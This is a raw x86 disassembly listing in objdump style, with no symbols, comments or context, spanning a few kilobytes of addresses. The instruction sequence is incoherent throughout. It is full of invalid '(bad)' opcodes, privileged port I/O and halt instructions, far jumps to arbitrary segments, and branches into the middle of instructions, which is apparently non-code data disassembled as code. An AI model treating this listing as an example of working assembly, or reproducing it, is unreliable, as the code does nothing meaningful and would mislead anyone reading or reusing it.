  40be22:	dec    esi
  40be23:	lahf   
  40be24:	pop    es
  40be25:	imul   edx,DWORD PTR [esi+0x46],0x74
  40be29:	leave  
  40be2a:	into   
  40be2b:	call   0x110407f9
  40be30:	jnp    0x40be8c
  40be32:	mov    ch,0x13
  40be34:	pop    edi
  40be35:	push   0xffffffad
  40be37:	and    DWORD PTR [esi+0x32],esp
  40be3a:	and    edi,edx
  40be3c:	ja     0x40bea2
  40be3e:	rol    BYTE PTR [edx-0x4c],cl
  40be41:	mov    dl,0x45
  40be43:	mov    bh,0x5f
  40be45:	imul   ebx,DWORD PTR [edx+0x7a],0x5f00997f
  40be4c:	mov    dh,dh
  40be4e:	cmp    DWORD PTR [edi+esi*2],ebp
  40be51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be52:	sub    al,0x28
  40be54:	cmp    al,bl
  40be56:	push   ebp
  40be57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be58:	outs   dx,BYTE PTR ds:[esi]
  40be59:	aam    0x6e
  40be5b:	pop    edi
  40be5c:	xchg   edi,eax
  40be5d:	mov    ebp,ebp
  40be5f:	scas   al,BYTE PTR es:[edi]
  40be60:	mov    fs,WORD PTR [ecx-0x7b]
  40be63:	aad    0x65
  40be65:	out    dx,eax
  40be66:	and    edx,DWORD PTR [ebx+0x29]
  40be69:	adc    eax,0x7ee6818
  40be6e:	fstp   st(3)
  40be70:	aas    
  40be71:	lahf   
  40be72:	ds pop edx
  40be74:	outs   dx,DWORD PTR ds:[esi]
  40be75:	icebp  
  40be76:	stos   BYTE PTR es:[edi],al
  40be77:	or     BYTE PTR [ecx-0x13081d10],bl
  40be7d:	stos   BYTE PTR es:[edi],al
  40be7e:	(bad)
  40be82:	mov    ebx,DWORD PTR [ebx+0x9cc859]
  40be88:	aaa    
  40be89:	and    edx,edi
  40be8b:	(bad)  
  40be8c:	mov    ds:0xf71afd35,al
  40be91:	inc    edi
  40be92:	imul   esi,DWORD PTR [ebx+0x12],0xad0e0d28
  40be99:	cmp    DWORD PTR [ecx],edx
  40be9b:	inc    ebp
  40be9c:	xchg   esp,eax
  40be9d:	aaa    
  40be9e:	out    0x9f,eax
  40bea0:	cli    
  40bea1:	cld    
  40bea2:	into   
  40bea3:	pop    esp
  40bea4:	mov    ecx,DWORD PTR [edi+0x25]
  40bea7:	scas   eax,DWORD PTR es:[edi]
  40bea8:	js     0x40bf21
  40beaa:	out    0xa7,al
  40beac:	xchg   ebp,eax
  40bead:	jecxz  0x40be3a
  40beaf:	mov    ah,0x66
  40beb1:	mov    eax,0xa4ed74ff
  40beb6:	(bad)
  40beb9:	or     ebp,DWORD PTR [edi-0x3c0a3eee]
  40bebf:	xchg   esp,eax
  40bec0:	or     BYTE PTR [ebx-0x42b803a6],dl
  40bec6:	into   
  40bec7:	push   0x69
  40bec9:	adc    ebx,0x4cd16562
  40becf:	push   esi
  40bed0:	pop    ecx
  40bed1:	outs   dx,BYTE PTR ds:[esi]
  40bed2:	add    ch,BYTE PTR [edx-0x4523332e]
  40bed8:	jbe    0x40bf41
  40beda:	out    0x51,eax
  40bedc:	jns    0x40bf17
  40bede:	(bad)  
  40bee0:	std    
  40bee1:	lahf   
  40bee2:	iret   
  40bee3:	and    ebp,ecx
  40bee5:	rcl    edi,0x92
  40bee8:	iret   
  40bee9:	inc    ebp
  40beea:	ja     0x40bf07
  40beec:	in     eax,dx
  40beed:	icebp  
  40beee:	and    DWORD PTR [ecx-0x277d455c],edi
  40bef4:	sub    eax,0x2d180777
  40bef9:	mov    esi,0x6883d060
  40befe:	out    dx,eax
  40beff:	inc    ebx
  40bf00:	std    
  40bf01:	rcr    BYTE PTR [ebp+0x16],0x54
  40bf05:	xor    BYTE PTR [edx-0x2f],ah
  40bf08:	pop    edx
  40bf09:	xor    eax,0x6bc6f993
  40bf0e:	cld    
  40bf0f:	mov    dl,0x46
  40bf11:	add    edi,DWORD PTR [eax-0x34]
  40bf14:	mov    ecx,0xa4fc5b08
  40bf19:	mov    ecx,0xe2a5d6cd
  40bf1e:	push   ecx
  40bf1f:	fdiv   st(2),st
  40bf21:	ss cmc 
  40bf23:	pop    ss
  40bf24:	rol    edx,1
  40bf26:	pop    edx
  40bf27:	push   ebp
  40bf28:	scas   al,BYTE PTR es:[edi]
  40bf29:	jge    0x40beb0
  40bf2b:	call   0x1b735685
  40bf30:	xchg   esp,eax
  40bf31:	rcr    BYTE PTR [edi+0x72199664],cl
  40bf37:	add    eax,0x4da32c2a
  40bf3c:	gs (bad) 
  40bf3e:	scas   al,BYTE PTR es:[edi]
  40bf3f:	leave  
  40bf40:	dec    ebp
  40bf41:	hlt    
  40bf42:	les    ebx,FWORD PTR [edi+eax*8+0x7951b5a6]
  40bf49:	xor    al,BYTE PTR [esi]
  40bf4b:	nop
  40bf4c:	lods   al,BYTE PTR ds:[esi]
  40bf4d:	xor    cl,cl
  40bf4f:	xor    eax,0xc543a2f0
  40bf54:	or     al,0x97
  40bf56:	pusha  
  40bf57:	aaa    
  40bf58:	jmp    0x40bf38
  40bf5a:	inc    esi
  40bf5b:	mov    ss,edx
  40bf5d:	xlat   BYTE PTR ds:[ebx]
  40bf5e:	pop    edx
  40bf5f:	sub    eax,0xaec4bda5
  40bf64:	sbb    al,0x3
  40bf66:	ins    DWORD PTR es:[edi],dx
  40bf67:	cmp    eax,0xa1886299
  40bf6c:	pop    ds
  40bf6d:	or     ah,0xe3
  40bf70:	cwde   
  40bf71:	push   0xffffff95
  40bf73:	bound  ecx,QWORD PTR [esp+edi*2+0x57]
  40bf77:	enter  0xf24d,0xdb
  40bf7b:	jmp    0x23d64c3
  40bf80:	mov    bh,0x3
  40bf82:	jg     0x40bf0e
  40bf84:	pop    es
  40bf85:	xlat   BYTE PTR ds:[ebx]
  40bf86:	dec    esi
  40bf87:	mov    eax,0x9e7d36e1
  40bf8c:	jbe    0x40bf2c
  40bf8e:	push   ecx
  40bf8f:	sar    DWORD PTR [ecx+0x5b],1
  40bf92:	not    BYTE PTR [ebx-0x11368059]
  40bf98:	adc    ebx,DWORD PTR [eax-0x4c]
  40bf9b:	add    al,0xcc
  40bf9d:	cwde   
  40bf9e:	mov    ch,bh
  40bfa0:	(bad)  
  40bfa1:	push   0x209ea2fc
  40bfa6:	sbb    eax,0xad1df001
  40bfab:	ss dec edi
  40bfad:	pusha  
  40bfae:	aad    0xf0
  40bfb0:	enter  0xba0c,0x79
  40bfb4:	pushf  
  40bfb5:	stc    
  40bfb6:	xchg   esp,eax
  40bfb7:	push   eax
  40bfb8:	adc    BYTE PTR [ebx],0x49
  40bfbb:	pop    es
  40bfbc:	mov    esi,ecx
  40bfbe:	and    DWORD PTR [ebx],esi
  40bfc0:	ins    DWORD PTR es:[edi],dx
  40bfc1:	out    0x16,al
  40bfc3:	pushf  
  40bfc4:	sbb    al,0xe
  40bfc6:	xchg   esp,eax
  40bfc7:	int    0x2
  40bfc9:	sbb    ebx,DWORD PTR [ebx]
  40bfcb:	cwde   
  40bfcc:	mov    al,0xf9
  40bfce:	call   0x3f1:0x9931488b
  40bfd5:	mov    eax,0x8ed7104e
  40bfda:	leave  
  40bfdb:	add    al,0xd0
  40bfdd:	and    DWORD PTR [esi+0x68],ebx
  40bfe0:	repz pop edi
  40bfe2:	xor    edx,0xffffffbe
  40bfe5:	sbb    BYTE PTR [esi],ch
  40bfe7:	sub    bl,ah
  40bfe9:	(bad)  [edx]
  40bfeb:	fiadd  DWORD PTR [esi-0x68]
  40bfee:	pop    esp
  40bfef:	push   ebp
  40bff0:	mov    ax,ds:0x31f3f22
  40bff6:	sub    BYTE PTR ds:0x7692b2fd,al
  40bffc:	ja     0x40c056
  40bffe:	inc    edx
  40bfff:	cli    
  40c000:	fsub   QWORD PTR [edi+0x38b285bd]
  40c006:	inc    edi
  40c007:	jmp    0x4f3253ea
  40c00c:	outs   dx,BYTE PTR ds:[esi]
  40c00d:	not    BYTE PTR [edi+0x39]
  40c010:	mov    esp,0x175c2f10
  40c015:	fistp  DWORD PTR [ebp+edx*8-0x64f9c737]
  40c01c:	adc    al,0x8a
  40c01e:	cmp    edx,DWORD PTR [ecx+eax*4]
  40c021:	or     eax,0xdb4523f4
  40c026:	inc    esi
  40c027:	jle    0x40c08e
  40c029:	add    edi,edi
  40c02b:	inc    edx
  40c02c:	es mov bh,0xbd
  40c02f:	jno    0x40c06d
  40c031:	(bad)  
  40c032:	jns    0x40c089
  40c034:	push   esp
  40c035:	dec    ebp
  40c036:	sbb    edx,esp
  40c038:	repz sahf 
  40c03a:	rcl    DWORD PTR [ebp+0x770f62b8],0x52
  40c041:	scas   eax,DWORD PTR es:[edi]
  40c042:	stc    
  40c043:	add    ebx,DWORD PTR [edx+0x2afb3933]
  40c049:	cmp    ebp,DWORD PTR [ebx]
  40c04b:	pop    ecx
  40c04c:	xor    eax,0xffffff8e
  40c04f:	cmp    ebp,eax
  40c051:	mov    ah,0xb5
  40c053:	jbe    0x40c0a8
  40c055:	jne    0x40bff1
  40c057:	jle    0x40c04b
  40c059:	ja     0x40c0c5
  40c05b:	retf   0x1628
  40c05e:	aaa    
  40c05f:	std    
  40c060:	hlt    
  40c061:	adc    eax,DWORD PTR [eax+0x64]
  40c064:	jecxz  0x40c02f
  40c066:	je     0x40bff7
  40c068:	sahf   
  40c069:	push   ecx
  40c06a:	jecxz  0x40c055
  40c06c:	imul   ebp,ecx,0x8405542e
  40c072:	(bad)  
  40c073:	int    0xf
  40c075:	mov    eax,0xe81823c8
  40c07a:	mov    edx,0x90e71d63
  40c07f:	mov    ebx,0x608e04d8
  40c084:	jno    0x40c045
  40c086:	jecxz  0x40c0af
  40c088:	jle    0x40c0ca
  40c08a:	and    esi,ecx
  40c08c:	ins    DWORD PTR es:[edi],dx
  40c08d:	xchg   edi,eax
  40c08e:	push   edi
  40c08f:	push   esp
  40c090:	push   esi
  40c091:	sub    DWORD PTR [ecx-0x5071baa3],esi
  40c097:	cdq    
  40c098:	ja     0x40c082
  40c09a:	lock sbb bh,BYTE PTR [esi]
  40c09d:	add    eax,0x85c81465
  40c0a2:	push   ebp
  40c0a3:	pop    ecx
  40c0a4:	(bad)  
  40c0a5:	ret    0x3d20
  40c0a8:	inc    ebp
  40c0a9:	lods   eax,DWORD PTR ds:[esi]
  40c0aa:	scas   eax,DWORD PTR es:[edi]
  40c0ab:	mov    eax,0x50d7bcea
  40c0b0:	or     al,0xd9
  40c0b2:	xor    eax,DWORD PTR [ecx+eax*2-0x695ad50d]
  40c0b9:	mov    ds:0xce33e921,al
  40c0be:	xchg   edx,eax
  40c0bf:	push   ecx
  40c0c0:	jbe    0x40c093
  40c0c2:	div    BYTE PTR [esi+0xc]
  40c0c5:	mov    bl,0x7d
  40c0c7:	loopne 0x40c122
  40c0c9:	sbb    dl,BYTE PTR [ebp+0x37]
  40c0cc:	(bad)  
  40c0cd:	out    dx,eax
  40c0ce:	jg     0x40c117
  40c0d0:	cmp    DWORD PTR [edi],ebp
  40c0d2:	pop    ebp
  40c0d3:	in     al,dx
  40c0d4:	out    0xc0,al
  40c0d6:	jae    0x40c124
  40c0d8:	cs ja  0x40c070
  40c0db:	loop   0x40c138
  40c0dd:	dec    ecx
  40c0de:	enter  0xbf5b,0x14
  40c0e2:	xchg   esp,eax
  40c0e3:	cmp    eax,0x205f700c
  40c0e8:	jnp    0x40c089
  40c0ea:	add    al,0xda
  40c0ec:	inc    eax
  40c0ed:	pop    ecx
  40c0ee:	fistp  QWORD PTR [ebx]
  40c0f0:	adc    esi,DWORD PTR [ecx+ebx*2]
  40c0f3:	fbld   TBYTE PTR [eax]
  40c0f5:	cmc    
  40c0f6:	mov    ds:0x5173d66d,eax
  40c0fb:	cmp    eax,0x4886a20
  40c100:	arpl   WORD PTR [ecx],dx
  40c102:	cld    
  40c103:	xor    cl,bl
  40c105:	jp     0x40c087
  40c107:	mov    esi,0x8e042856
  40c10c:	enter  0x4b38,0xcc
  40c110:	or     eax,0x643fbd52
  40c115:	stos   BYTE PTR es:[edi],al
  40c116:	ins    BYTE PTR es:[edi],dx
  40c117:	nop
  40c118:	call   edx
  40c11a:	xchg   BYTE PTR [ecx-0x3518e686],dl
  40c120:	or     ah,dh
  40c122:	inc    esi
  40c123:	test   BYTE PTR [ebp-0x74fa7c98],bl
  40c129:	mov    DWORD PTR [ebx-0xd],ebx
  40c12c:	mov    ah,0xfd
  40c12e:	popf   
  40c12f:	mov    esp,0x5abd977b
  40c134:	(bad)  
  40c135:	fnstenv [edi+0x5f0c13f1]
  40c13b:	bound  edi,QWORD PTR [esp+ebx*4-0x79]
  40c13f:	jnp    0x40c192
  40c141:	add    al,0x7d
  40c143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c144:	neg    DWORD PTR [ebx+0x74]
  40c147:	jno    0x40c0fc
  40c149:	jle    0x40c0f8
  40c14b:	out    dx,al
  40c14c:	mov    edi,0x5787532
  40c151:	push   ss
  40c152:	int3   
  40c153:	jnp    0x40c198
  40c155:	mov    dh,0xc2
  40c157:	rol    esi,0x5b
  40c15a:	addr16 aam 0x46
  40c15d:	pop    edi
  40c15e:	scas   eax,DWORD PTR es:[edi]
  40c15f:	test   dl,cl
  40c161:	in     eax,0x50
  40c163:	jae    0x40c197
  40c165:	test   eax,0x7bbceb84
  40c16a:	int    0x7a
  40c16c:	cmp    eax,0x89d9d888
  40c171:	hlt    
  40c172:	pop    esp
  40c173:	sahf   
  40c174:	adc    BYTE PTR [edi+0x74],dl
  40c177:	inc    edx
  40c178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c179:	push   esi
  40c17a:	pop    ebp
  40c17b:	test   DWORD PTR [ebx-0x11],ecx
  40c17e:	das    
  40c17f:	add    DWORD PTR [edi+0x737a964f],0xc
  40c186:	inc    ebx
  40c187:	arpl   WORD PTR [esi+0x6d],di
  40c18a:	xlat   BYTE PTR ds:[ebx]
  40c18b:	jmp    0x2e48:0xa83c3ad1
  40c192:	sahf   
  40c193:	sub    dl,BYTE PTR [eax]
  40c195:	jo     0x40c132
  40c197:	in     eax,dx
  40c198:	ins    BYTE PTR es:[edi],dx
  40c199:	mov    ebx,0x66a3aacf
  40c19e:	mov    bl,0xa3
  40c1a0:	std    
  40c1a1:	sbb    ecx,esi
  40c1a3:	push   ebp
  40c1a4:	aas    
  40c1a5:	imul   ebp,ecx,0x9e2f14a3
  40c1ab:	push   esi
  40c1ac:	fs push ebx
  40c1ae:	call   0x3252c72a
  40c1b3:	push   ebx
  40c1b4:	fist   WORD PTR [ebx+eiz*2]
  40c1b7:	dec    ebx
  40c1b8:	in     eax,0x24
  40c1ba:	lea    ecx,[esi+ecx*4]
  40c1bd:	fmul   QWORD PTR [edi-0x74]
  40c1c0:	hlt    
  40c1c1:	mov    esi,0x37eac73e
  40c1c6:	loopne 0x40c17c
  40c1c8:	in     al,0xa8
  40c1ca:	arpl   WORD PTR [edi],ax
  40c1cc:	push   ss
  40c1cd:	lock ret 
  40c1cf:	inc    edi
  40c1d0:	mov    dh,0x18
  40c1d2:	and    al,BYTE PTR [ecx]
  40c1d4:	adc    eax,DWORD PTR [edi+0x63]
  40c1d7:	cli    
  40c1d8:	jl     0x40c1cb
  40c1da:	sbb    DWORD PTR [esp-0xbf2fee7],esp
  40c1e1:	dec    eax
  40c1e2:	stos   DWORD PTR es:[edi],eax
  40c1e3:	pop    es
  40c1e4:	rol    eax,cl
  40c1e6:	lds    ecx,FWORD PTR [edx+edx*1+0x16]
  40c1ea:	adc    al,0x42
  40c1ec:	int3   
  40c1ed:	sbb    esi,DWORD PTR [edi-0x37]
  40c1f0:	pop    ss
  40c1f1:	data16 sahf 
  40c1f3:	inc    ebx
  40c1f4:	inc    cl
  40c1f6:	push   cs
  40c1f7:	(bad)  
  40c1f8:	sub    ebp,DWORD PTR [esi-0x79a52b85]
  40c1fe:	pop    ss
  40c1ff:	and    DWORD PTR [ebx+esi*4+0x2b],ebx
  40c203:	enter  0x9ed3,0x64
  40c207:	cmp    eax,0xefec6068
  40c20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c20d:	repnz sahf 
  40c20f:	dec    ecx
  40c210:	xor    al,0x82
  40c212:	ficomp DWORD PTR ds:0x894fbe8b
  40c218:	(bad)  
  40c219:	mov    dl,0xee
  40c21b:	or     ebx,edi
  40c21d:	(bad)  
  40c21e:	jmp    0xc1263c7e
  40c223:	add    BYTE PTR [edi],cl
  40c225:	jg     0x40c264
  40c227:	js     0x40c1f1
  40c229:	ja     0x40c249
  40c22b:	stos   BYTE PTR es:[edi],al
  40c22c:	aaa    
  40c22d:	or     eax,0xea242ed4
  40c232:	inc    ebp
  40c233:	sar    DWORD PTR [esi],cl
  40c235:	ins    DWORD PTR es:[edi],dx
  40c236:	mov    WORD PTR ds:0x2fecd15b,ds
  40c23c:	xchg   edx,eax
  40c23d:	inc    edx
  40c23e:	push   0x47
  40c240:	dec    edx
  40c241:	add    DWORD PTR [edx-0x79],ebp
  40c244:	cld    
  40c245:	(bad)  
  40c246:	jbe    0x40c276
  40c248:	xchg   esp,eax
  40c249:	iret   
  40c24a:	xor    ecx,ebx
  40c24c:	cmc    
  40c24d:	mov    eax,0xbf152030
  40c252:	add    BYTE PTR [ecx+0x58b0b882],bh
  40c258:	punpcklbw mm4,DWORD PTR [ecx+0x15]
  40c25c:	test   al,0xc7
  40c25e:	or     al,0x3e
  40c260:	dec    ebx
  40c261:	inc    ecx
  40c262:	dec    esi
  40c263:	fild   QWORD PTR [edi+0x43d3b2ab]
  40c269:	imul   edi,DWORD PTR [ecx+edi*8+0x3b],0x3aafa04
  40c271:	adc    dl,dl
  40c273:	mov    ch,0xd9
  40c275:	mov    ebx,0xa828f168
  40c27a:	cmp    eax,0x2ffa1020
  40c27f:	and    BYTE PTR [eax+eax*8-0x5612ea01],dh
  40c286:	int3   
  40c287:	hlt    
  40c288:	call   0x390a:0x85917df
  40c28f:	inc    eax
  40c290:	add    DWORD PTR ds:0xc450f7c3,0xea918292
  40c29a:	and    DWORD PTR [esi+eax*8],0x4686f289
  40c2a1:	clc    
  40c2a2:	xchg   ebp,eax
  40c2a3:	inc    edx
  40c2a4:	pop    eax
  40c2a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2a6:	not    BYTE PTR ds:0x5a3dc5be
  40c2ac:	cdq    
  40c2ad:	push   eax
  40c2ae:	jmp    0x4766:0x7c4b54a1
  40c2b5:	cli    
  40c2b6:	jne    0x40c2c5
  40c2b8:	mov    ch,0xfd
  40c2ba:	imul   ebp,esp,0x3d
  40c2bd:	leave  
  40c2be:	mov    dl,0xdf
  40c2c0:	jae    0x40c2c4
  40c2c2:	sub    al,0xfe
  40c2c4:	cmp    ebx,ebx
  40c2c6:	mov    ecx,0xe8262cde
  40c2cb:	xor    BYTE PTR [edi+ecx*4-0x42],ah
  40c2cf:	add    edx,ebx
  40c2d1:	fld    TBYTE PTR [ebp-0x2ba29778]
  40c2d7:	es ret 
  40c2d9:	dec    ebp
  40c2da:	(bad)  
  40c2db:	jne    0x40c282
  40c2dd:	nop
  40c2de:	mov    ds:0xe84e3e1,eax
  40c2e3:	and    dl,BYTE PTR [ebx+0x352de20]
  40c2e9:	lods   eax,DWORD PTR ds:[esi]
  40c2ea:	pop    ebp
  40c2eb:	fcmovu st,st(7)
  40c2ed:	cld    
  40c2ee:	mov    ebx,0x4bbdbfe1
  40c2f3:	xchg   ebx,eax
  40c2f4:	mov    bl,0x9d
  40c2f6:	or     al,0xcb
  40c2f8:	(bad)
  40c2fd:	mov    dl,0xa3
  40c2ff:	cli    
  40c300:	push   eax
  40c301:	pusha  
  40c302:	jecxz  0x40c2c8
  40c304:	loope  0x40c28d
  40c306:	push   0xe9181198
  40c30b:	push   0x3c5807b3
  40c310:	int3   
  40c311:	fwait
  40c312:	pop    edi
  40c313:	stos   DWORD PTR es:[edi],eax
  40c314:	inc    edi
  40c315:	push   esi
  40c316:	stos   BYTE PTR es:[edi],al
  40c317:	pop    ecx
  40c318:	and    al,0x10
  40c31a:	aad    0xf5
  40c31c:	hlt    
  40c31d:	xor    ah,BYTE PTR [eax]
  40c31f:	adc    edx,DWORD PTR [ebx+0x72]
  40c322:	push   ecx
  40c323:	call   0x4beca6d
  40c328:	mov    edi,0x92d133f5
  40c32d:	jo     0x40c2e4
  40c32f:	dec    ecx
  40c330:	(bad)  
  40c331:	pop    ecx
  40c332:	(bad)  
  40c333:	xlat   BYTE PTR ds:[ebx]
  40c334:	das    
  40c335:	cli    
  40c336:	pop    ebp
  40c337:	test   eax,0x807fcfd4
  40c33c:	add    al,0xe3
  40c33e:	loope  0x40c35a
  40c340:	pop    ecx
  40c341:	(bad)  [ecx+0x2d]
  40c344:	sar    esp,0x27
  40c347:	or     bl,BYTE PTR [ebx]
  40c349:	inc    ecx
  40c34a:	xchg   ah,ah
  40c34c:	hlt    
  40c34d:	mov    ah,0xcc
  40c34f:	(bad)  
  40c351:	int    0x60
  40c353:	out    0x5,eax
  40c355:	stos   DWORD PTR es:[edi],eax
  40c356:	pop    edi
  40c357:	push   edx
  40c358:	mov    dh,0xdb
  40c35a:	es pop esi
  40c35c:	call   0xc978:0xd2be73bc
  40c363:	lods   al,BYTE PTR ds:[esi]
  40c364:	mov    DWORD PTR [eax+edx*8+0x7d],edi
  40c368:	call   0x9ab7:0x974fd6b2
  40c36f:	cmp    dl,BYTE PTR [ecx+0x754f6bcb]
  40c375:	leave  
  40c376:	stc    
  40c377:	jbe    0x40c32d
  40c379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c37a:	test   DWORD PTR [edx-0x33f83d67],ecx
  40c380:	mov    ch,0xb
  40c382:	xor    ah,cl
  40c384:	adc    eax,0xc2b9fb86
  40c389:	adc    DWORD PTR [ebp+0x42],0xffffff80
  40c38d:	enter  0x23e0,0xe1
  40c391:	mov    eax,0x69c3b549
  40c396:	dec    ecx
  40c397:	cmp    ah,BYTE PTR [edx-0x6ccbf4b5]
  40c39d:	or     DWORD PTR [edi],ebp
  40c39f:	sub    eax,0x3bcdcf78
  40c3a4:	sub    al,0xe8
  40c3a6:	push   eax
  40c3a7:	xchg   ecx,eax
  40c3a8:	push   ebx
  40c3a9:	mov    dh,0x99
  40c3ab:	xchg   edi,eax
  40c3ac:	sbb    eax,0xb6f2f68a
  40c3b1:	xchg   ecx,eax
  40c3b2:	pop    ebx
  40c3b3:	cmp    al,0xb8
  40c3b5:	nop
  40c3b6:	sti    
  40c3b7:	psubq  mm3,QWORD PTR [esi+0x53]
  40c3bb:	ds pop eax
  40c3bd:	push   ecx
  40c3bf:	mov    al,ds:0x8d6d4753
  40c3c4:	pushf  
  40c3c5:	xor    DWORD PTR [esi+0x15d09a6b],eax
  40c3cb:	aam    0xbe
  40c3cd:	iret   
  40c3ce:	pop    ss
  40c3cf:	pop    ebp
  40c3d0:	rcl    BYTE PTR ds:0x7421befe,0x3e
  40c3d7:	sti    
  40c3d8:	cmovns eax,DWORD PTR [eax+edx*8-0xce5e990]
  40c3e0:	push   edi
  40c3e1:	repz push ebx
  40c3e3:	into   
  40c3e4:	mov    DWORD PTR [ebx-0x53],ebx
  40c3e7:	call   0x97a41b
  40c3ec:	dec    ebx
  40c3ed:	aas    
  40c3ee:	sub    DWORD PTR [edx-0x14d4ac11],edx
  40c3f4:	mov    edx,0xac04c6ab
  40c3fa:	jg     0x40c3bc
  40c3fc:	retf   
  40c3fd:	push   eax
  40c3fe:	ins    BYTE PTR es:[edi],dx
  40c3ff:	add    ebp,DWORD PTR [edi]
  40c401:	xor    ah,BYTE PTR ds:0xd84f0def
  40c407:	xchg   edi,eax
  40c408:	(bad)  
  40c409:	xchg   edi,eax
  40c40a:	les    edx,FWORD PTR [edi+edi*4]
  40c40d:	sub    al,0x5f
  40c40f:	jg     0x40c485
  40c411:	ret    
  40c412:	ror    BYTE PTR [edi],1
  40c414:	stc    
  40c415:	mov    al,BYTE PTR [eax+0x2b]
  40c418:	sbb    al,0xb8
  40c41a:	sbb    eax,0xa1d4294f
  40c41f:	cmp    BYTE PTR [ebx+0x5d],bh
  40c422:	adc    BYTE PTR [ecx-0x5c33d17e],cl
  40c428:	jmp    DWORD PTR [edx-0x64a0d17b]
  40c42e:	jl     0x40c3eb
  40c430:	out    0xc0,al
  40c432:	cs push cs
  40c434:	pop    ecx
  40c435:	test   eax,0x8d030cbe
  40c43a:	iret   
  40c43b:	mov    ebx,0x73b47bd4
  40c440:	imul   ecx,DWORD PTR [ebp+eiz*1-0x69],0xf4b19549
  40c448:	ja     0x40c417
  40c44a:	mov    al,ds:0xcfcc6421
  40c44f:	stos   DWORD PTR es:[edi],eax
  40c450:	mov    al,BYTE PTR [edx]
  40c452:	push   esi
  40c453:	mov    dl,0xc2
  40c455:	dec    eax
  40c456:	push   ds
  40c457:	mov    bl,0x63
  40c459:	gs mov edx,0xc2f2ff85
  40c45f:	mov    eax,ds:0x1f303b09
  40c464:	pop    ebx
  40c465:	push   ds
  40c466:	fmul   DWORD PTR [edi]
  40c468:	inc    eax
  40c469:	aad    0x27
  40c46b:	pop    esp
  40c46c:	lock sar DWORD PTR [ecx-0x6bdbac8e],0x1f
  40c474:	out    0x9d,eax
  40c476:	xchg   esp,eax
  40c477:	fwait
  40c478:	adc    BYTE PTR [edi+ebx*2],0x1a
  40c47c:	push   edi
  40c47d:	shr    DWORD PTR ds:0xafe77b1d,0xf2
  40c484:	jmp    FWORD PTR [esi]
  40c486:	dec    ebx
  40c487:	inc    edi
  40c488:	xchg   ebp,eax
  40c489:	loopne 0x40c49c
  40c48b:	add    BYTE PTR [edx],dh
  40c48d:	push   esp
  40c48e:	cli    
  40c48f:	jns    0x40c44b
  40c491:	imul   edx,DWORD PTR ss:[edx+ebp*4],0xf27178
	...
  40c511:	add    BYTE PTR [eax],al
  40c513:	add    BYTE PTR [esi],ah
  40c515:	ss pop ecx
  40c517:	sbb    BYTE PTR [ecx+0x7f],bl
  40c51a:	addr16 ds loope 0x40c540
  40c51e:	dec    edx
  40c51f:	inc    esp
  40c520:	outs   dx,BYTE PTR ds:[esi]
  40c521:	jecxz  0x40c537
  40c523:	push   ebp
  40c524:	add    eax,0x6c000075
  40c529:	pop    es
  40c52a:	add    BYTE PTR [eax],al
  40c52c:	nop
  40c52d:	mov    edx,0xf8781345
  40c532:	fidiv  DWORD PTR [bp+di+0x7973]
  40c537:	or     eax,0xba24bb14
  40c53c:	xchg   ebp,eax
  40c53d:	stc    
  40c53e:	mov    ebp,0x6583f665
  40c543:	out    0x73,eax
  40c545:	and    al,0x82
  40c547:	sub    DWORD PTR [edx+0x53a57177],edx
  40c54d:	adc    DWORD PTR es:[edx+0x2b8c6292],ebx
  40c554:	inc    ebx
  40c555:	sub    al,0x82
  40c557:	pop    ss
  40c558:	sbb    BYTE PTR [ebp+ecx*2-0x6f3c4905],cl
  40c55f:	push   ebx
  40c560:	mov    al,0xc6
  40c562:	inc    esi
  40c563:	imul   esi,esi,0xb32d83ef
  40c569:	xor    al,0xc9
  40c56b:	jge    0x40c54e
  40c56d:	pop    ds
  40c56e:	call   0xe19d:0x9448b609
  40c575:	test   al,0xdf
  40c577:	mov    ebp,0x68b3add
  40c57c:	les    edx,FWORD PTR [edx+ebx*2]
  40c57f:	xchg   ebx,edi
  40c581:	dec    esi
  40c582:	imul   ebp,DWORD PTR [edi+0x500223b3],0x42
  40c589:	jne    0x40c604
  40c58b:	mov    esp,0x267bc507
  40c590:	pop    esp
  40c591:	mov    eax,ds:0x35cc5c34
  40c596:	mov    edx,0xbfe7bb36
  40c59b:	push   esp
  40c59c:	push   0xc952ff0
  40c5a1:	mov    bh,0x5e
  40c5a3:	ds stos DWORD PTR es:[edi],eax
  40c5a5:	adc    eax,0x9a34dda7
  40c5aa:	add    ecx,DWORD PTR [ecx+0x2f8a8e6b]
  40c5b0:	jns    0x40c535
  40c5b2:	addr16 pop eax
  40c5b4:	pop    ebp
  40c5b5:	sbb    al,0xae
  40c5b7:	jmp    0x56ac:0xb7ea238b
  40c5be:	sar    DWORD PTR [edi+0x13],0x61
  40c5c2:	dec    esi
  40c5c3:	dec    ebp
  40c5c4:	out    dx,al
  40c5c5:	cmc    
  40c5c6:	sub    ecx,DWORD PTR [si-0x4d]
  40c5ca:	xchg   esp,eax
  40c5cb:	mov    WORD PTR ss:[edi],gs
  40c5ce:	jb     0x40c589
  40c5d0:	mov    eax,0xf70cf9ca
  40c5d5:	dec    ebp
  40c5d6:	dec    esi
  40c5d7:	sub    ecx,DWORD PTR [edi+edx*4]
  40c5da:	ins    BYTE PTR es:[edi],dx
  40c5db:	ret    0x9b8f
  40c5de:	pop    ebx
  40c5df:	mov    ebp,0x4cf5f52b
  40c5e4:	xchg   ebx,eax
  40c5e5:	sbb    al,0x8c
  40c5e7:	ins    BYTE PTR es:[edi],dx
  40c5e8:	ret    0x8c6c
  40c5eb:	data16 add al,dl
  40c5ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ef:	lahf   
  40c5f0:	not    DWORD PTR [esi+0x29]
  40c5f3:	ror    DWORD PTR [eax-0x588e441a],cl
  40c5f9:	add    BYTE PTR ds:0xd77e2596,al
  40c5ff:	into   
  40c600:	adc    ebx,ebx
  40c602:	xor    al,0x86
  40c604:	call   0x4fda99c1
  40c609:	pushf  
  40c60a:	cmp    eax,0x4b7ed905
  40c60f:	adc    ebp,DWORD PTR [edi-0x64fe2db8]
  40c615:	jmp    0xa9cb:0x5ebbfb3e
  40c61c:	enter  0x22f,0x2c
  40c620:	jne    0x40c696
  40c622:	xor    eax,ecx
  40c624:	xchg   ebp,eax
  40c625:	inc    edi
